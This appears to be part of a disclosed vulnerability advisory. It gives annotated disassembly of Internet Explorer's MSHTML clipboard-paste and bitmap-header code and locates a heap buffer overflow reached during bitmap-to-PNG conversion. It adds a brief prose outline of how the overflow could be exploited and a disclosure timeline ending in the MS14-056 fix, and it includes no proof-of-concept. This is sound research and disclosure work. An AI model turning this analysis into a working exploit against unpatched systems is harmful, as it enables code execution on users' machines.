+72cf641f 39442428        cmp     dword ptr [esp+28h],eax
+72cf6423 7407            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x1f7 (72cf642c)
+72cf6425 8b442428        mov     eax,dword ptr [esp+28h]
+72cf6429 894510          mov     dword ptr [ebp+10h],eax
+72cf642c 8b4b08          mov     ecx,dword ptr [ebx+8]
+72cf642f 8d442424        lea     eax,[esp+24h]
+72cf6433 50              push    eax
+72cf6434 57              push    edi
+72cf6435 e886255aff      call    MSHTML!CHTMLEditor::Get­Flow­Element (722989c0)
+72cf643a 8bf0            mov     esi,eax
+72cf643c 85f6            test    esi,esi
+72cf643e 0f8889040000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6444 8b442424        mov     eax,dword ptr [esp+24h]
+72cf6448 85c0            test    eax,eax
+72cf644a 750a            jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x221 (72cf6456)
+72cf644c c744244401000000 mov     dword ptr [esp+44h],1
+72cf6454 eb3a            jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x25b (72cf6490)
+72cf6456 8b30            mov     esi,dword ptr [eax]
+72cf6458 8d4c2440        lea     ecx,[esp+40h]
+72cf645c e82e5462ff      call    MSHTML!CSmart­Ptr<IHTMLElement3>::operator& (7231b88f)
+72cf6461 50              push    eax
+72cf6462 6854e82172      push    offset MSHTML!IID_­IHTMLElement3 (7221e854)
+72cf6467 ff74242c        push    dword ptr [esp+2Ch]
+72cf646b ff16            call    dword ptr [esi]
+72cf646d 8bf0            mov     esi,eax
+72cf646f 85f6            test    esi,esi
+72cf6471 0f8856040000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6477 8b442440        mov     eax,dword ptr [esp+40h]
+72cf647b 8d542444        lea     edx,[esp+44h]
+72cf647f 52              push    edx
+72cf6480 50              push    eax
+72cf6481 8b08            mov     ecx,dword ptr [eax]
+72cf6483 ff5124          call    dword ptr [ecx+24h]
+72cf6486 8bf0            mov     esi,eax
+72cf6488 85f6            test    esi,esi
+72cf648a 0f883d040000    js      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6490 8b7c2454        mov     edi,dword ptr [esp+54h]
+72cf6494 6bc714          imul    eax,edi,14h
+72cf6497 01442414        add     dword ptr [esp+14h],eax
+72cf649b e9cc010000      jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x437 (72cf666c)
+72cf64a0 66837c244400    cmp     word ptr [esp+44h],0
+72cf64a6 750e            jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x281 (72cf64b6)
+72cf64a8 83ff03          cmp     edi,3
+72cf64ab 7409            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x281 (72cf64b6)
+72cf64ad 83ff02          cmp     edi,2
+72cf64b0 0f85b0010000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72cf6666)
+72cf64b6 8b4d10          mov     ecx,dword ptr [ebp+10h]
+72cf64b9 ff742414        push    dword ptr [esp+14h]
+72cf64bd 51              push    ecx
+72cf64be 8b01            mov     eax,dword ptr [ecx]
+72cf64c0 ff5014          call    dword ptr [eax+14h]
+72cf64c3 85c0            test    eax,eax
+72cf64c5 0f859b010000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72cf6666)
+72cf64cb 83ff04          cmp     edi,4
+72cf64ce 7418            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x2b3 (72cf64e8)
+72cf64d0 83ff01          cmp     edi,1
+72cf64d3 7413            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x2b3 (72cf64e8)
+72cf64d5 83ff03          cmp     edi,3
+72cf64d8 740e            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x2b3 (72cf64e8)
+72cf64da 83ff02          cmp     edi,2
+72cf64dd 7409            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x2b3 (72cf64e8)
+72cf64df 85ff            test    edi,edi
+72cf64e1 7405            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x2b3 (72cf64e8)
+72cf64e3 83ff08          cmp     edi,8
+72cf64e6 7524            jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x2d7 (72cf650c)
+72cf64e8 8b4d10          mov     ecx,dword ptr [ebp+10h]
+72cf64eb 8d542468        lea     edx,[esp+68h]
+72cf64ef 52              push    edx
+72cf64f0 ff742418        push    dword ptr [esp+18h]
+72cf64f4 8b01            mov     eax,dword ptr [ecx]
+72cf64f6 51              push    ecx
+72cf64f7 ff500c          call    dword ptr [eax+0Ch]
+72cf64fa 85c0            test    eax,eax
+72cf64fc 0f8564010000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72cf6666)
+72cf6502 8b44246c        mov     eax,dword ptr [esp+6Ch]
+72cf6506 89442410        mov     dword ptr [esp+10h],eax
+72cf650a eb04            jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x2db (72cf6510)
+72cf650c 8b442410        mov     eax,dword ptr [esp+10h]
+72cf6510 85ff            test    edi,edi
+72cf6512 0f84f8000000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x3db (72cf6610)
+72cf6518 83ff01          cmp     edi,1
+72cf651b 744d            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x335 (72cf656a)
+72cf651d 83ff02          cmp     edi,2
+72cf6520 0f84d1020000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x5c2 (72cf67f7)
+72cf6526 0f8e3a010000    jle     MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72cf6666)
+72cf652c 83ff04          cmp     edi,4
+72cf652f 0f8e0d020000    jle     MSHTML!CPaste­Command::Paste­From­Clipboard+0x50d (72cf6742)
+72cf6535 83ff08          cmp     edi,8
+72cf6538 0f8528010000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72cf6666)
+72cf653e 50              push    eax
+72cf653f ff15e043dc72    call    dword ptr [MSHTML!_imp__­Global­Lock (72dc43e0)]
+72cf6545 8bf8            mov     edi,eax
+72cf6547 8b442410        mov     eax,dword ptr [esp+10h]
+72cf654b 89442420        mov     dword ptr [esp+20h],eax
+72cf654f 85ff            test    edi,edi
+72cf6551 0f8524010000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x446 (72cf667b)
+72cf6557 be0e000780      mov     esi,8007000Eh
+72cf655c 8d4c2420        lea     ecx,[esp+20h]
+72cf6560 e819f1bfff      call    MSHTML!TSmart­Handle<void *,&Global­Unlock>::~TSmart­Handle<void *,&Global­Unlock> (728f567e)
+72cf6565 e963030000      jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf656a 8b4c242c        mov     ecx,dword ptr [esp+2Ch]
+72cf656e e87b8f0200      call    MSHTML!Ed­Util::Is­Rtf­Converter­Enabled (72d1f4ee)
+72cf6573 85c0            test    eax,eax
+72cf6575 0f84eb000000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72cf6666)
+72cf657b ff742410        push    dword ptr [esp+10h]
+72cf657f ff15e043dc72    call    dword ptr [MSHTML!_imp__­Global­Lock (72dc43e0)]
+72cf6585 85c0            test    eax,eax
+72cf6587 0f84ff010000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x557 (72cf678c)
+72cf658d 8d4c2420        lea     ecx,[esp+20h]
+72cf6591 8bd0            mov     edx,eax
+72cf6593 51              push    ecx
+72cf6594 e8a598fdff      call    MSHTML!CRtf­To­Html­Converter::String­Rtf­To­String­Html (72ccfe3e)
+72cf6599 ff742410        push    dword ptr [esp+10h]
+72cf659d 8bf0            mov     esi,eax
+72cf659f ff15dc43dc72    call    dword ptr [MSHTML!_imp__­Global­Unlock (72dc43dc)]
+72cf65a5 85f6            test    esi,esi
+72cf65a7 0f85b4000000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x42c (72cf6661)
+72cf65ad 397518          cmp     dword ptr [ebp+18h],esi
+72cf65b0 7436            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x3b3 (72cf65e8)
+72cf65b2 397520          cmp     dword ptr [ebp+20h],esi
+72cf65b5 741d            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x39f (72cf65d4)
+72cf65b7 ff7524          push    dword ptr [ebp+24h]
+72cf65ba 8bcb            mov     ecx,ebx
+72cf65bc ff751c          push    dword ptr [ebp+1Ch]
+72cf65bf ff750c          push    dword ptr [ebp+0Ch]
+72cf65c2 ff7508          push    dword ptr [ebp+8]
+72cf65c5 e802bbffff      call    MSHTML!CPaste­Command::Fire­Paste­Event­And­Remove­Selection (72cf20cc)
+72cf65ca 8bf0            mov     esi,eax
+72cf65cc 85f6            test    esi,esi
+72cf65ce 0f85f9020000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf65d4 ff742420        push    dword ptr [esp+20h]
+72cf65d8 8b4b08          mov     ecx,dword ptr [ebx+8]
+72cf65db ff750c          push    dword ptr [ebp+0Ch]
+72cf65de ff7508          push    dword ptr [ebp+8]
+72cf65e1 e89158fdff      call    MSHTML!CHTMLEditor::Do­The­Darn­IE50Paste­HTML (72ccbe77)
+72cf65e6 eb1a            jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x3cd (72cf6602)
+72cf65e8 ff7524          push    dword ptr [ebp+24h]
+72cf65eb 8bcb            mov     ecx,ebx
+72cf65ed ff751c          push    dword ptr [ebp+1Ch]
+72cf65f0 ff7520          push    dword ptr [ebp+20h]
+72cf65f3 ff74242c        push    dword ptr [esp+2Ch]
+72cf65f7 ff750c          push    dword ptr [ebp+0Ch]
+72cf65fa ff7508          push    dword ptr [ebp+8]
+72cf65fd e861e4ffff      call    MSHTML!CPaste­Command::Handle­UIPaste­HTML (72cf4a63)
+72cf6602 ff742420        push    dword ptr [esp+20h]
+72cf6606 8bf0            mov     esi,eax
+72cf6608 ff15f044dc72    call    dword ptr [MSHTML!_imp__­Global­Free (72dc44f0)]
+72cf660e eb23            jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x3fe (72cf6633)
+72cf6610 837d1800        cmp     dword ptr [ebp+18h],0
+72cf6614 0f8578020000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x65d (72cf6892)
+72cf661a ff7524          push    dword ptr [ebp+24h]
+72cf661d 8bcb            mov     ecx,ebx
+72cf661f ff751c          push    dword ptr [ebp+1Ch]
+72cf6622 ff7520          push    dword ptr [ebp+20h]
+72cf6625 50              push    eax
+72cf6626 ff750c          push    dword ptr [ebp+0Ch]
+72cf6629 ff7508          push    dword ptr [ebp+8]
+72cf662c e832e4ffff      call    MSHTML!CPaste­Command::Handle­UIPaste­HTML (72cf4a63)
+72cf6631 8bf0            mov     esi,eax
+72cf6633 85f6            test    esi,esi
+72cf6635 0f8992020000    jns     MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf663b 8b4d08          mov     ecx,dword ptr [ebp+8]
+72cf663e 8b01            mov     eax,dword ptr [ecx]
+72cf6640 ff9080000000    call    dword ptr [eax+80h]
+72cf6646 85c0            test    eax,eax
+72cf6648 0f847f020000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf664e 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
+72cf6651 8b01            mov     eax,dword ptr [ecx]
+72cf6653 ff9080000000    call    dword ptr [eax+80h]
+72cf6659 85c0            test    eax,eax
+72cf665b 0f846c020000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6661 be64000480      mov     esi,80040064h
+72cf6666 47              inc     edi
+72cf6667 8344241414      add     dword ptr [esp+14h],14h
+72cf666c 3b7c2448        cmp     edi,dword ptr [esp+48h]
+72cf6670 0f8d57020000    jge     MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (72cf68cd)
+72cf6676 e925feffff      jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x26b (72cf64a0)
+
+7202667b 50              push    eax                                            
+7202667c ff15e4430f72    call    dword ptr [MSHTML!_imp__­Global­Size (720f43e4)] <eax> = 
+72026682 89442450        mov     dword ptr [esp+50h],eax                        u­Bitmap­Info­Size<stack> = u­Bitmap­Info­Size<eax>
+72026686 83f82c          cmp     eax,2Ch                                        if (u­Bitmap­Info­Size<eax> < 0x2C)
+72026689 0f82cdfeffff    jb      7202655c                                           goto label1
+7202668f 8b17            mov     edx,dword ptr [edi]                            larg2<edx> = po­Bitmap­Info<edi>->BITMAPINFOHEADER.bi­Size
+72026691 8d442438        lea     eax,[esp+38h]                                  &u­Actual­Bitmap­Info­Size<eax> = &(u­Actual­Bitmap­Info­Size<stack>)
+72026695 8b4f14          mov     ecx,dword ptr [edi+14h]                        larg1<ecx> = po­Bitmap­Info<edi>->BITMAPINFOHEADER.bi­Size­Image
+72026698 8364243800      and     dword ptr [esp+38h],0                          u­Actual­Bitmap­Info­Size<stack> = 0
+7202669d 50              push    eax                                            larg3<stack> = &pab­Image­Data<eax>
+7202669e e8f9da28ff      call    712b419c                                       h­Result<eax> = MSHTML!UInt­Add(                                                  u­Actual­Bitmap­Info­Size = po­Bitmap­Info->bi­Size­Image + po­Bitmap­Info->bi­Size
+                                                                                    po­Bitmap­Info<edi>->bi­Size­Image<ecx>                                         h­Result<eax> = error code on integer overflow
+                                                                                    po­Bitmap­Info<edi>->bi­Size<edx>
+                                                                                    &u­Actual­Bitmap­Info­Size<eax>
+                                                                                    );
+720266a3 8bf0            mov     esi,eax                                        h­Result<esi> = h­Result<eax>
+720266a5 85f6            test    esi,esi                                        if (h­Result<esi> < 0)
+720266a7 0f88affeffff    js      7202655c                                           goto label1
+720266ad 8b442450        mov     eax,dword ptr [esp+50h]                        u­Bitmap­Info­Size<eax> = u­Bitmap­Info­Size<stack>
+720266b1 3b442438        cmp     eax,dword ptr [esp+38h]                        if (u­Bitmap­Info­Size<eax> < u­Actual­Bitmap­Info­Size<stack>)
+720266b5 0f82a1feffff    jb      7202655c                                           goto label1
+720266bb 8364243400      and     dword ptr [esp+34h],0                          po­Original­Bitmap<stack> = 0
+720266c0 8d4c244c        lea     ecx,[esp+4Ch]                                  &u­Bitmap­Size<ecx> = &(u­Bitmap­Size<stack>)
+720266c4 8364244c00      and     dword ptr [esp+4Ch],0                          u­Bitmap­Size<stack> = 0
+720266c9 51              push    ecx                                            larg4<stack> = &u­Bitmap­Size<ecx>
+720266ca 8d4c2438        lea     ecx,[esp+38h]                                  &po­Bitmap<ecx> = &(po­Bitmap<stack>)
+720266ce 51              push    ecx                                            larg3<stack> = &po­Bitmap<ecx>
+720266cf 50              push    eax                                            larg2<stack> = u­Bitmap­Info­Size<eax>
+720266d0 57              push    edi                                            larg1<stack> = po­Bitmap­Info<edi>
+720266d1 e8af020000      call    72026985                                       h­Result<eax> = MSHTML!CPaste­Command::Prepend­Bitmap­Header(
+                                                                                    po­Bitmap­Info = po­Bitmap­Info<edi>
+                                                                                    u­Bitmap­Info­Size = u­Bitmap­Info­Size<eax>
+                                                                                    ppo­Bitmap = &po­Bitmap,
+                                                                                    pu­Bitmap­Size = &u­Bitmap­Size);
+720266d6 8bf0            mov     esi,eax                                        h­Result<esi> = h­Result<eax>
+720266d8 85f6            test    esi,esi                                        if (h­Result<esi> != 0)
+720266da 0f857cfeffff    jne     7202655c                                           goto label1
+720266e0 21442438        and     dword ptr [esp+38h],eax                        pab­Image­Data<stack> = NULL<eax>
+720266e4 21442450        and     dword ptr [esp+50h],eax                        u­Png­Image­Size<stack> = 0<eax>
+720266e8 8d442450        lea     eax,[esp+50h]                                  &u­Png­Image­Size<eax> = &(u­Png­Image­Size<stack>)
+720266ec 50              push    eax                                            larg4<stack> = &u­Png­Image­Size<eax>
+720266ed 8d44243c        lea     eax,[esp+3Ch]                                  &pab­Image­Data<eax> = &(pab­Image­Data<stack>)
+720266f1 50              push    eax                                            larg3<stack> = &pab­Image­Data<eax>
+720266f2 ff742454        push    dword ptr [esp+54h]                            larg2<stack> = u­Bitmap­Size<stack>
+720266f6 ff742440        push    dword ptr [esp+40h]                            larg1<stack> = po­Bitmap<stack>
+720266fa e8feb1ffff      call    720218fd                                       MSHTML!CPaste­Command::Convert­Bitmapto­Png(
+                                                                                    po­Bitmap = po­Bitmap<stack>,
+   **** SHIT HITS FAN ****                                                          u­Bitmap­Size = u­Bitmap­Size<stack>,
+                                                                                    ppo­Png­Image = &pab­Image­Data,
+                                                                                    pu­Png­Image­Size = &u­Png­Image­Size<stack>)
+720266ff ff742434        push    dword ptr [esp+34h]
+72026703 8bf0            mov     esi,eax
+72026705 e8fdc85fff      call    71623007                                       MSHTML!operator delete(...)
+7202670a 59              pop     ecx
+7202670b 85f6            test    esi,esi
+7202670d 0f8549feffff    jne     7202655c                                           goto label1;
+72026713 ff7524          push    dword ptr [ebp+24h]
+72026716 8bcb            mov     ecx,ebx
+72026718 ff751c          push    dword ptr [ebp+1Ch]
+7202671b ff7520          push    dword ptr [ebp+20h]
+7202671e ff74245c        push    dword ptr [esp+5Ch]
+72026722 ff742448        push    dword ptr [esp+48h]
+72026726 ff750c          push    dword ptr [ebp+0Ch]
+72026729 ff7508          push    dword ptr [ebp+8]
+7202672c e81ce2ffff      call    7202494d                                       MSHTML!CPaste­Command::Handle­Paste­Image(...)
+72026731 ff742438        push    dword ptr [esp+38h]
+72026735 8bf0            mov     esi,eax
+72026737 e8cbc85fff      call    MSHTML!operator delete (71623007)
+7202673c 59              pop     ecx
+7202673d e91afeffff      jmp     7202655c                                  label1
+
+7202650c 8b442410        mov     eax,dword ptr [esp+10h]
+72026510 85ff            test    edi,edi
+72026512 0f84f8000000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x3db (72026610)
+72026518 83ff01          cmp     edi,1
+7202651b 744d            je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x335 (7202656a)
+7202651d 83ff02          cmp     edi,2
+72026520 0f84d1020000    je      MSHTML!CPaste­Command::Paste­From­Clipboard+0x5c2 (720267f7)
+72026526 0f8e3a010000    jle     MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72026666)
+7202652c 83ff04          cmp     edi,4
+7202652f 0f8e0d020000    jle     MSHTML!CPaste­Command::Paste­From­Clipboard+0x50d (72026742)
+72026535 83ff08          cmp     edi,8
+72026538 0f8528010000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x431 (72026666)
+7202653e 50              push    eax
+7202653f ff15e0430f72    call    dword ptr [MSHTML!_imp__­Global­Lock (720f43e0)]
+72026545 8bf8            mov     edi,eax
+72026547 8b442410        mov     eax,dword ptr [esp+10h]
+7202654b 89442420        mov     dword ptr [esp+20h],eax
+7202654f 85ff            test    edi,edi
+72026551 0f8524010000    jne     MSHTML!CPaste­Command::Paste­From­Clipboard+0x446 (7202667b)
+72026557 be0e000780      mov     esi,8007000Eh
+label1:
+7202655c 8d4c2420        lea     ecx,[esp+20h]
+72026560 e819f1bfff      call    MSHTML!TSmart­Handle<void *,&Global­Unlock>::~TSmart­Handle<void *,&Global­Unlock> (71c2567e)
+72026565 e963030000      jmp     MSHTML!CPaste­Command::Paste­From­Clipboard+0x698 (720268cd)
+MSHTML!CPaste­Command..Prepend­Bitmap­Header.txt
+MSHTML!CPaste­Command­Prepend­Bitmap­Header(
+  VOID* po­Bitmap­Info<ebp+8>,
+  UINT u­Bitmap­Info­Size<ebp+C>,
+  VOID** ppo­Bitmap<ebp+10>,
+  UINT* u­Bitmap­Size<ebp+14>
+):
+  u­Bitmap­Size<ebp-4>
+72cf6985 8bff            mov     edi,edi                                        
+72cf6987 55              push    ebp                                            
+72cf6988 8bec            mov     ebp,esp                                        
+72cf698a 51              push    ecx                                            
+72cf698b 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]                        larg1<ecx> = u­Bitmap­Info­Size<ebp+C>
+72cf698e 8d45fc          lea     eax,[ebp-4]                                    &u­Bitmap­Size<eax> = &u­Bitmap­Size<ebp-4>
+72cf6991 8365fc00        and     dword ptr [ebp-4],0                            u­Bitmap­Size<ebp-4> = 0
+72cf6995 56              push    esi                                            
+72cf6996 57              push    edi                                            
+72cf6997 50              push    eax                                            larg3<stack> = &u­Bitmap­Size<eax>
+72cf6998 6a0e            push    0Eh                                            
+72cf699a 5a              pop     edx                                            larg2<edx> = 0x­E
+72cf699b e8fcd728ff      call    71f8419c                                       MSHTML!UInt­Add(                                                                 u­Bitmap­Size = u­Bitmap­Info­Size + 0x­E
+                                                                                    u­Bitmap­Info­Size<ecx>,                                                       
+                                                                                    0x­E<edx>,                                                                   h­Result = error code on integer overflow
+                                                                                    &u­Bitmap­Size<eax>);
+72cf69a0 8bf8            mov     edi,eax                                        h­Result<edi> = h­Result<eax>
+72cf69a2 85ff            test    edi,edi                                        if (h­Result<edi> < 0)                                                           if (h­Result < 0)
+72cf69a4 7850            js      72cf69f6                                           goto return_­error;                                                              return 0x8007000E;
+72cf69a6 8b75fc          mov     esi,dword ptr [ebp-4]                          u­Bitmap­Size<esi> = u­Bitmap­Size<ebp-4>
+72cf69a9 56              push    esi                                            larg3<stack> = u­Bitmap­Size<esi>
+72cf69aa 6a00            push    0                                              larg2<stack> = 0
+72cf69ac ff3510ccd972    push    dword ptr [72d9cc10]                           larg1<stack> = MSHTML!g_­h­Process­Heap
+72cf69b2 e8eaa620ff      call    71f010a1                                       po­Bitmap<eax> = MSHTML!Heap­Alloc(                                               po­Bitmap<eax> = Heap­Alloc(g_­h­Process­Heap, 0, u­Bitmap­Size);
+                                                                                    MSHTML!g_­h­Process­Heap,
+                                                                                    0,
+                                                                                    u­Bitmap­Size<esi>);
+72cf69b7 8b4d10          mov     ecx,dword ptr [ebp+10h]                        ppo­Bitmap<ecx> = ppo­Bitmap<ebp+10>
+72cf69ba 8901            mov     dword ptr [ecx],eax                            *(ppo­Bitmap<ecx>) = po­Bitmap<eax>                                               *ppo­Bitmap = po­Bitmap
+72cf69bc 85c0            test    eax,eax                                        if (po­Bitmap<eax> == NULL)                                                      if (po­Bitmap == NULL)
+72cf69be 7436            je      72cf69f6                                           goto return_­error;                                                              return 0x8007000E;
+72cf69c0 ff750c          push    dword ptr [ebp+0Ch]                            larg4<stack> = u­Bitmap­Info­Size
+72cf69c3 b9424d0000      mov     ecx,4D42h                                      "BM"<ecx> = 0x4D42
+72cf69c8 897002          mov     dword ptr [eax+2],esi                          po­Bitmap<eax>->BITMAPFILEHEADER.bf­Size = u­Bitmap­Size<esi>                       po­Bitmap->BITMAPFILEHEADER.bf­Size = u­Bitmap­Size
+72cf69cb ff7508          push    dword ptr [ebp+8]                              larg3<stack> = po­Bitmap­Info<ebp+8>
+72cf69ce 668908          mov     word ptr [eax],cx                              po­Bitmap<eax>->BITMAPFILEHEADER.bf­Type = "BM"<cx>                               po­Bitmap->BITMAPFILEHEADER.bf­Type = "BM"
+72cf69d1 33c9            xor     ecx,ecx                                        0<ecx> = 0
+72cf69d3 ff750c          push    dword ptr [ebp+0Ch]                            larg2<stack> = u­Bitmap­Info­Size                                                  po­Bitmap->BITMAPFILEHEADER.bf­Reserved1 = 0
+72cf69d6 894806          mov     dword ptr [eax+6],ecx                          po­Bitmap<eax>->BITMAPFILEHEADER.bf­Reserved12 = 0                                po­Bitmap->BITMAPFILEHEADER.bf­Reserved2 = 0
+72cf69d9 c7400a36000000  mov     dword ptr [eax+0Ah],36h                        po­Bitmap<eax>->BITMAPFILEHEADER.bf­Off­Bits = 0x36                                po­Bitmap->BITMAPFILEHEADER.bf­Off­Bits = 0x36
+72cf69e0 83c00e          add     eax,0Eh                                        &(po­Bitmap.BITMAPINFO)<eax> = po­Bitmap<eax> + sizeof(BITMAPFILEHEADER)
+72cf69e3 50              push    eax                                            larg1<stack> = &o­Bitmap­Info<eax>
+72cf69e4 ff159841dc72    call    dword ptr [72dc4198]                           MSHTML!_imp__­memcpy_­s(                                                          memcpy_­s(&(po­Bitmap->BITMAPINFO), u­Bitmap­Info­Size, po­Bitmap­Info, u­Bitmap­Info­Size)
+                                                                                    &(po­Bitmap.BITMAPINFO)<stack>,
+                                                                                    u­Bitmap­Info­Size<stack>,
+                                                                                    po­Bitmap­Info<stack>,
+                                                                                    u­Bitmap­Info­Size<stack>);
+72cf69ea 8b4514          mov     eax,dword ptr [ebp+14h]                        pu­Bitmap­Size<eax> = pu­Bitmap­Size<ebp+14>
+72cf69ed 83c410          add     esp,10h                                        WTF!?
+72cf69f0 8930            mov     dword ptr [eax],esi                            *(pu­Bitmap­Size<eax>) = u­Bitmap­Size<esi>                                         *pu­Bitmap­Size = u­Bitmap­Size
+72cf69f2 8bc7            mov     eax,edi                                        h­Result<eax> = h­Result<edi>                                                     return s_­OK;
+72cf69f4 eb05            jmp     72cf69fb                                       goto return;
+                                                                                return_­error:
+72cf69f6 b80e000780      mov     eax,8007000Eh                                  h­Result<eax> = 0x8007000E
+                                                                                return:
+72cf69fb 5f              pop     edi                                            
+72cf69fc 5e              pop     esi                                            
+72cf69fd 8be5            mov     esp,ebp                                        
+72cf69ff 5d              pop     ebp                                            
+72cf6a00 c21000          ret     10h                                            return h­Result<eax>
+
+
+Exploit
+
+An attacker looking to exploit this issue will commonly attempt to get the memory allocated to store the PNG image in a location that is followed by a pre-allocated memory block that contains information the attacker would like to modify. Using the buffer overflow, the attacker can overwrite this pre-allocated memory block with attacker controlled data. Depending on the type of the pre-allocated memory, this could allow the attacker to read or modify arbitrary information within the process and take control of execution flow. No attempt was made to create a Proof-of-Concept that shows this level of control.
+
+Time-line
+
+8 May 2014: This vulnerability was submitted to ZDI.
+9 June 2014: This vulnerability was acquired by ZDI.
+23 June 2014: This vulnerability was disclosed to Microsoft by ZDI.
+14 October 2014: This vulnerability was address by Microsoft in MS14-056.
+21 December 2016: Details of this vulnerability are released.
+-->
